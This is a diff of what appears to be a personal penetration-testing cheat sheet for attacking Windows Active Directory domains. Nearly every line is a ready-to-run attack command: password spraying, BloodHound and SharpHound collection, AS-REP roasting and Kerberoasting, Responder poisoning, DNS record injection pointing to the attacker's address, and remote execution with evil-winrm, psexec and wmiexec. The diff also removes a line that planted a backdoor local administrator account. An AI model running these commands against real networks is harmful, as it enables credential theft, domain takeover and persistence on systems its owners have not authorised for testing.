@@ -1170,22 +1170,21 @@ unzip backup.zip -d .
 ## Spray Services
 sprayme '$USERNAME:$PASSWORD' <HOSTS_FILE>
 
-## Valid Creds
--->> Keep Clock Synced
+## Keep Clock Synced
 sudo skewme $TARGET
 
--->> Get Bloodhound Data
+## Get Bloodhound Data
 impacket-getTGT $DOM/'$USERNAME:$PASSWORD'; kcme
 bloodhound-ce-python -u '$USERNAME' -k -no-pass -d $DOM -ns $TARGET -op $DC_$TARGET --zip -c All; unzip $DC*_bloodhound.zip -d /Upload/bloodhound
 //$MYIP/$/Sharphound.exe --ldapusername '$USERNAME' --ldappassword '$PASSWORD'
 
--->> Get Usernames and Computers
+## Get Usernames and Computers
 cat /Upload/bloodhound/*_users.json | jq -r '.. | .samaccountname? // empty' | tee usernames_$DC
 cat /Upload/bloodhound/*_computers.json | jq -r '.. | .samaccountname? // empty' | tee computers_$DC
 impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag && $1 ~ /^[A-Za-z]/ {print $1}' | awk NF | tr '[:upper:]' '[:lower:]' | tee usernames_$DC
 impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass | awk '/---/{flag=1;next} flag && $1 ~ /^[A-Za-z]/ {print $1}' | awk NF | tr '[:upper:]' '[:lower:]' | tee computers_$DC
 
--->> Initial Attacks
+## Initial Attacks
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames_$DC
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -no-preauth 'NPUserjjones' -usersfile usernames_$DC
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames_$DC
@@ -1196,7 +1195,7 @@ sudo responder -I tun0 -v
 dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record '*'
 dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
 
--->> Login or Execute Commands
+## Command Execution
 evil-winrm-py -i $TARGET -u '$USERNAME' -p '$PASSWORD'
 evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
 evil-winrm-py -i $DC -r $DOM
@@ -1204,9 +1203,6 @@ impacket-psexec $DOM/'$USERNAME:$PASSWORD'@$TARGET
 impacket-smbclient $DOM/'$USERNAME:$PASSWORD'@$TARGET
 impacket-wmiexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
 impacket-atexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
-
--->> Create Local Admin Account
-powershell -c "net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add"
 
 # Post-Exploitation 
 ## Start Fileserver
